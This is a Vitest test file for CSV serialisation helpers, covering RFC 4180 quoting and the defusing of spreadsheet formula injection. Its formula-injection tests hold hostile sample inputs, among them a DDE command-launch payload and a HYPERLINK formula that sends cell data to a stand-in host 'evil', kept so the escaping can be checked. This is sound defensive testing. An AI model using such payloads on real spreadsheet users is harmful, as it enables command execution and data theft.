import { describe, expect, it } from 'vitest';

import { CSV_LINE_BREAK, toCSVRow, toCSVValue } from './csv';

describe('toCSVValue', () => {
  describe('empty values', () => {
    it.each([
      [undefined, ''],
      [null, ''],
      ['', ''],
    ])('serializes %p as an empty field', (input, expected) => {
      expect(toCSVValue(input)).toBe(expected);
    });

    it('keeps falsy values that are not empty', () => {
      expect(toCSVValue(0)).toBe('0');
      expect(toCSVValue(false)).toBe('false');
    });
  });

  describe('RFC 4180 quoting', () => {
    it('leaves plain values unquoted', () => {
      expect(toCSVValue('plain')).toBe('plain');
    });

    it('quotes values containing the delimiter', () => {
      expect(toCSVValue('a,b')).toBe('"a,b"');
    });

    it('doubles inner quotes and wraps the field', () => {
      expect(toCSVValue('He said "hi", ok')).toBe('"He said ""hi"", ok"');
    });

    it('quotes values containing a quote even without a delimiter', () => {
      expect(toCSVValue('say "hi"')).toBe('"say ""hi"""');
    });

    it.each([
      ['line1\nline2', '"line1\nline2"'],
      ['line1\r\nline2', '"line1\r\nline2"'],
    ])('quotes %p so the row is not split', (input, expected) => {
      expect(toCSVValue(input)).toBe(expected);
    });

    it('honours a custom delimiter', () => {
      expect(toCSVValue('a;b', { delimiter: ';' })).toBe('"a;b"');
      expect(toCSVValue('a,b', { delimiter: ';' })).toBe('a,b');
    });
  });

  describe('formula injection', () => {
    it.each([
      ["=cmd|'/c calc'!A0", "'=cmd|'/c calc'!A0"],
      ['@SUM(1+9)*cmd', "'@SUM(1+9)*cmd"],
      ['-2+3', "'-2+3"],
      ['+49 151 12345', "'+49 151 12345"],
      ['\t=1+1', "'\t=1+1"],
    ])('defuses %p', (input, expected) => {
      expect(toCSVValue(input)).toBe(expected);
    });

    it('defuses and quotes an exfiltration payload', () => {
      expect(toCSVValue('=HYPERLINK("http://evil/"&A1,"click")')).toBe(
        '"\'=HYPERLINK(""http://evil/""&A1,""click"")"'
      );
    });

    it.each(['-5', '+3.2', '1e-4', '-0.5', '+1E10'])('leaves the number %p untouched', (input) => {
      expect(toCSVValue(input)).toBe(input);
    });

    it('can be opted out of', () => {
      expect(toCSVValue('=1+1', { escapeFormulas: false })).toBe('=1+1');
    });

    it('still quotes correctly when escaping is disabled', () => {
      expect(toCSVValue('=1+1,2', { escapeFormulas: false })).toBe('"=1+1,2"');
    });
  });
});

describe('toCSVRow', () => {
  it('joins serialized values with the delimiter', () => {
    expect(toCSVRow(['Title', 'a,b', 'say "hi"', '=1+1', null])).toBe(
      'Title,"a,b","say ""hi""",\'=1+1,'
    );
  });

  it('honours a custom delimiter', () => {
    expect(toCSVRow(['a', 'b;c'], { delimiter: ';' })).toBe('a;"b;c"');
  });

  it('produces a parsable document when joined with CSV_LINE_BREAK', () => {
    const rows = [
      toCSVRow(['Title', 'Body']),
      toCSVRow(['a,b', 'multi\nline']),
      toCSVRow(['=1+1', 'say "hi"']),
    ];

    expect(rows.join(CSV_LINE_BREAK) + CSV_LINE_BREAK).toBe(
      'Title,Body\r\n"a,b","multi\nline"\r\n\'=1+1,"say ""hi"""\r\n'
    );
  });
});
